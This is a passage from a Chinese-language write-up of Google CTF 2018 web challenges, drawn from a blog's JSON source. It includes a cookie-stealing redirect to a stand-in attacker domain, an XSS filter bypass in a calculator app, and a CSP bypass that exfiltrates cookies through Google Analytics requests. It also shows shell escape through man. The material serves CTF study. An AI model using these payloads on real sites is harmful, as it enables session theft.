class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>这样，当管理员点击该页面之后，就会自动登录，从而执行我们的payload。</p>\n<p>exploit.js:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location.href=&apos;https://[YOURDOMAIN]/log.php?&apos;+document.cookie;</span><br></pre></td></tr></table></figure>\n<h2 id=\"gcalc\"><a href=\"#gcalc\" class=\"headerlink\" title=\"gcalc\"></a>gcalc</h2><p>app.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> e = <span class=\"string\">\"function\"</span> == <span class=\"keyword\">typeof</span> <span class=\"built_in\">Object</span>.assign ? <span class=\"built_in\">Object</span>.assign : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> c = <span class=\"number\">1</span>; c &lt; <span class=\"built_in\">arguments</span>.length; c++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> d = <span class=\"built_in\">arguments</span>[c];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (d)</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> f <span class=\"keyword\">in</span> d) <span class=\"built_in\">Object</span>.prototype.hasOwnProperty.call(d, f) &amp;&amp; (a[f] = d[f])</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    g = <span class=\"string\">\"function\"</span> == <span class=\"keyword\">typeof</span> <span class=\"built_in\">Object</span>.defineProperties ? <span class=\"built_in\">Object</span>.defineProperty : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b, c</span>) </span>&#123;</span><br><span class=\"line\">        a != <span class=\"built_in\">Array</span>.prototype &amp;&amp; a != <span class=\"built_in\">Object</span>.prototype &amp;&amp; (a[b] = c.value)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    h = <span class=\"string\">\"undefined\"</span> != <span class=\"keyword\">typeof</span> <span class=\"built_in\">window</span> &amp;&amp; <span class=\"built_in\">window</span> === <span class=\"keyword\">this</span> ? <span class=\"keyword\">this</span> : <span class=\"string\">\"undefined\"</span> != <span class=\"keyword\">typeof</span> global &amp;&amp; <span class=\"literal\">null</span> != global ? global : <span class=\"keyword\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">k</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> b = h, c = [<span class=\"string\">\"Object\"</span>, <span class=\"string\">\"assign\"</span>], d = <span class=\"number\">0</span>; d &lt; c.length - <span class=\"number\">1</span>; d++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> f = c[d];</span><br><span class=\"line\">            f <span class=\"keyword\">in</span> b || (b[f] = &#123;&#125;);</span><br><span class=\"line\">            b = b[f]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        c = c[c.length - <span class=\"number\">1</span>];</span><br><span class=\"line\">        d = b[c];</span><br><span class=\"line\">        a = a(d);</span><br><span class=\"line\">        a != d &amp;&amp; <span class=\"literal\">null</span> != a &amp;&amp; g(b, c, &#123;</span><br><span class=\"line\">            configurable: !<span class=\"number\">0</span>,</span><br><span class=\"line\">            writable: !<span class=\"number\">0</span>,</span><br><span class=\"line\">            value: a</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">k(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a || e</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">l</span>(<span class=\"params\">a, b, c, d, f</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.location = a;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.c = b;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.mdDialog = d;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.f = f;</span><br><span class=\"line\">    n(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    a = a.search();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a.expr &amp;&amp; a.vars) <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> m = p(a.expr, a.vars);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.a = <span class=\"keyword\">this</span>.screen = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        q(<span class=\"keyword\">this</span>, m);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.b.ans = <span class=\"built_in\">parseFloat</span>(m) || <span class=\"number\">0</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (v) &#123;</span><br><span class=\"line\">        q(<span class=\"keyword\">this</span>, <span class=\"string\">\"Error\"</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">l.$inject = [<span class=\"string\">\"$location\"</span>, <span class=\"string\">\"$http\"</span>, <span class=\"string\">\"$httpParamSerializer\"</span>, <span class=\"string\">\"$mdDialog\"</span>, <span class=\"string\">\"vcRecaptchaService\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">q</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">    a.screen = a.a ? a.screen + b : b</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">n</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    a.screen = <span class=\"string\">\"0\"</span>;</span><br><span class=\"line\">    a.a = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    a.b = &#123;</span><br><span class=\"line\">        pi: <span class=\"number\">3.14159</span>,</span><br><span class=\"line\">        ans: <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">p</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">    a = <span class=\"built_in\">String</span>(a).toLowerCase();</span><br><span class=\"line\">    b = <span class=\"built_in\">String</span>(b);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"regexp\">/^(?:[\\(\\)\\*\\/\\+%\\-0-9 ]|\\bvars\\b|[.]\\w+)*$/</span>.test(a)) <span class=\"keyword\">throw</span> <span class=\"built_in\">Error</span>(a);</span><br><span class=\"line\">    b = <span class=\"built_in\">JSON</span>.parse(b, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (b &amp;&amp; <span class=\"string\">\"object\"</span> === <span class=\"keyword\">typeof</span> b &amp;&amp; !<span class=\"built_in\">Array</span>.isArray(b)) <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.assign(<span class=\"built_in\">Object</span>.create(<span class=\"literal\">null</span>), b);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">\"number\"</span> === <span class=\"keyword\">typeof</span> b) <span class=\"keyword\">return</span> b</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"keyword\">new</span> <span class=\"built_in\">Function</span>(<span class=\"string\">\"vars\"</span>, <span class=\"string\">\"return \"</span> + a))(b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">r</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p(a.a, <span class=\"built_in\">JSON</span>.stringify(a.b))</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (b) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Error\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">t</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = <span class=\"keyword\">new</span> URL(<span class=\"string\">\"https://gcalc2.web.ctfcompetition.com\"</span>);</span><br><span class=\"line\">    b.pathname = <span class=\"string\">\"/\"</span>;</span><br><span class=\"line\">    b.searchParams.set(<span class=\"string\">\"expr\"</span>, a.a);</span><br><span class=\"line\">    b.searchParams.set(<span class=\"string\">\"vars\"</span>, <span class=\"built_in\">JSON</span>.stringify(a.b));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> b + <span class=\"string\">\"\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">l.prototype.permalink = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.mdDialog.show(<span class=\"keyword\">this</span>.mdDialog.alert(&#123;</span><br><span class=\"line\">        title: <span class=\"string\">\"Link\"</span>,</span><br><span class=\"line\">        htmlContent: t(<span class=\"keyword\">this</span>),</span><br><span class=\"line\">        ok: <span class=\"string\">\"Ok\"</span></span><br><span class=\"line\">    &#125;))</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">l.prototype.showCaptcha = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.mdDialog.show(&#123;</span><br><span class=\"line\">        contentElement: <span class=\"string\">\"#captchaDialog\"</span>,</span><br><span class=\"line\">        parent: angular.element(<span class=\"built_in\">document</span>.body)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">l.prototype.cloud = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"keyword\">this</span>.f.getResponse();</span><br><span class=\"line\">    a ? (<span class=\"keyword\">this</span>.c(&#123;</span><br><span class=\"line\">        method: <span class=\"string\">\"POST\"</span>,</span><br><span class=\"line\">        url: <span class=\"string\">\"/report\"</span>,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            expr: <span class=\"keyword\">this</span>.a,</span><br><span class=\"line\">            vars: <span class=\"built_in\">JSON</span>.stringify(<span class=\"keyword\">this</span>.b),</span><br><span class=\"line\">            recaptcha: a</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;), <span class=\"keyword\">this</span>.mdDialog.hide()) : alert(<span class=\"string\">\"Wrong captcha.\"</span>)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">l.prototype.btnClick = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/[0-9.]/</span>.test(a)) q(<span class=\"keyword\">this</span>, a), <span class=\"keyword\">this</span>.a += a;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/[*\\/+%-]/</span>.test(a)) q(<span class=\"keyword\">this</span>, <span class=\"string\">\" \"</span> + a + <span class=\"string\">\" \"</span>), <span class=\"keyword\">this</span>.a += a;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/[(]/</span>.test(a)) q(<span class=\"keyword\">this</span>, <span class=\"string\">\" \"</span> + a), <span class=\"keyword\">this</span>.a += a;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/[)]/</span>.test(a)) q(<span class=\"keyword\">this</span>, a + <span class=\"string\">\" \"</span>), <span class=\"keyword\">this</span>.a += a;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"string\">\"\\u03c0\"</span> == a) q(<span class=\"keyword\">this</span>, <span class=\"string\">\" \\u03c0 \"</span>), <span class=\"keyword\">this</span>.a += <span class=\"string\">\" vars.pi\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">switch</span> (a) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"ac\"</span>:</span><br><span class=\"line\">            n(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"ans\"</span>:</span><br><span class=\"line\">            q(<span class=\"keyword\">this</span>, <span class=\"string\">\" Ans \"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.a += <span class=\"string\">\" vars.ans\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"=\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.a) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            a = r(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.a = <span class=\"keyword\">this</span>.screen = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">            q(<span class=\"keyword\">this</span>, a);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.b.ans = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"pow\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.a) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            a =</span><br><span class=\"line\">                r(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">            a *= a;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.screen = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.a = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>;</span><br><span class=\"line\">            q(<span class=\"keyword\">this</span>, a);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.b.ans = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"sqrt\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.a &amp;&amp; (a = <span class=\"built_in\">Math</span>.sqrt(r(<span class=\"keyword\">this</span>)), <span class=\"keyword\">this</span>.screen = <span class=\"string\">\"\"</span>, <span class=\"keyword\">this</span>.a = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>, q(<span class=\"keyword\">this</span>, a), <span class=\"keyword\">this</span>.b.ans = <span class=\"built_in\">parseFloat</span>(a) || <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">u</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    a.html5Mode(!<span class=\"number\">0</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u.$inject = [<span class=\"string\">\"$locationProvider\"</span>];</span><br><span class=\"line\">angular.module(<span class=\"string\">\"calcApp\"</span>, [<span class=\"string\">\"ngMaterial\"</span>, <span class=\"string\">\"ngMessages\"</span>, <span class=\"string\">\"ngSanitize\"</span>, <span class=\"string\">\"vcRecaptcha\"</span>]).controller(<span class=\"string\">\"CalcCtrl\"</span>, l).config(u);</span><br></pre></td></tr></table></figure>\n<p>漏洞点：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function p(a, b) &#123;</span><br><span class=\"line\">    a = String(a).toLowerCase();</span><br><span class=\"line\">    b = String(b);</span><br><span class=\"line\">    if (!/^(?:[\\(\\)\\*\\/\\+%\\-0-9 ]|\\bvars\\b|[.]\\w+)*$/.test(a)) throw Error(a);</span><br><span class=\"line\">    b = JSON.parse(b, function(a, b) &#123;</span><br><span class=\"line\">        if (b &amp;&amp; &quot;object&quot; === typeof b &amp;&amp; !Array.isArray(b)) return Object.assign(Object.create(null), b);</span><br><span class=\"line\">        if (&quot;number&quot; === typeof b) return b</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    return (new Function(&quot;vars&quot;, &quot;return &quot; + a))(b)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该函数用户处理参数a,b对应我们的参数expr, vars。只要能够绕过该过滤即可实现XSS。</p>\n<p>有问题的paylaod:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// alert(1) // Remove whitespaces by yourself</span><br><span class=\"line\">vars.pi.constructor.constructor(</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(97)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(108)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(101)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(114)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(116)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(40)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(49)+</span><br><span class=\"line\">  vars.pi.toString().constructor.fromCharCode(41)</span><br><span class=\"line\">)()</span><br></pre></td></tr></table></figure>\n<p>如果没有<code>String(a).toLowerCase()</code>，那么该payload可行。</p>\n<p>基础paylaod:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0,&quot;alert(1)&quot;:0&#125;</span><br></pre></td></tr></table></figure>\n<p>使用上边的paylaod，我们可以执行alert()。</p>\n<p>接下来就是绕过CSP。</p>\n<p>CSP of /：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: default-src &apos;self&apos;; child-src https://sandbox-gcalc2.web.ctfcompetition.com/</span><br></pre></td></tr></table></figure>\n<p>CSP of  /static/calc.html:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: default-src &apos;self&apos;; frame-ancestors https://gcalc2.web.ctfcompetition.com/; font-src https://fonts.gstatic.com; style-src &apos;self&apos; https://*.googleapis.com &apos;unsafe-inline&apos;; script-src &apos;self&apos; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com &apos;unsafe-eval&apos; https://www.googletagmanager.com; child-src https://www.google.com/recaptcha/; img-src https://www.google-analytics.com;</span><br></pre></td></tr></table></figure>\n<p>我们看到<code>img-src https://www.google-analytics.com;</code></p>\n<p>那么就可以通过google-analystic获取cookie。</p>\n<p>首先申请google-analystic，得到tid=UA-121623607-1</p>\n<p>有效payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=hao123%27;document.querySelector(%27body%27).append(x)%22:0&#125;</span><br></pre></td></tr></table></figure>\n<p>最终payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=12344%27%2bencodeURIComponent(document.cookie);document.querySelector(%27body%27).append(x)%22:0&#125;</span><br></pre></td></tr></table></figure>\n<p>google-anaystic-console:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://analytics.google.com/analytics/web/?hl=zh-CN&amp;pli=1#/realtime/rt-event/a121623607w179580825p177873825/metric.type=5/</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Beginner’s-Quest-Moar\"><a href=\"#Beginner’s-Quest-Moar\" class=\"headerlink\" title=\"Beginner’s Quest - Moar\"></a>Beginner’s Quest - Moar</h2><p>When we netcat to the server we can see man socat output only. But man allows us to execute commands. All we need to do is to type !command. Running !ls -la /home/moar reveals some secret file disable_dmz.sh. Let’s cat it.</p>\n<p>man命令允许执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!ls /home/moar</span><br><span class=\"line\">disable_dmz.sh</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manual page socat(1) line 1 (press h for help or q to quit)!cat /home/moar/disable_dmz.sh</span><br><span class=\"line\">!cat /home/moar/disable_dmz.sh</span><br><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">echo &apos;Disabling DMZ using password CTF&#123;SOmething-CATastr0phic&#125;&apos;</span><br><span class=\"line\">echo CTF&#123;SOmething-CATastr0phic&#125; &gt; /dev/dmz</span><br></pre></td></tr></table></figure>\n<h2 id=\"Beginner’s-Router-UI\"><a href=\"#Beginner’s-Router-UI\" class=\"headerlink\" title=\"Beginner’s Router UI\"></a>Beginner’s Router UI</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body class=&quot;text-center&quot;&gt;</span><br><span class=\"line\">   &lt;form class=&quot;form-signin&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">     &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;OffHub Management Interface&lt;/h1&gt;</span><br><span class=\"line\">     &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;username&quot;&gt;</span><br><span class=\"line\">     &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;password&quot;&gt;</span><br><span class=\"line\">     &lt;button class=&quot;btn btn-block&quot; type=&quot;submit&quot;&gt;Sign in&lt;/button&gt;</span><br><span class=\"line\">   &lt;/form&gt;</span><br><span class=\"line\"> &lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>payload;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span 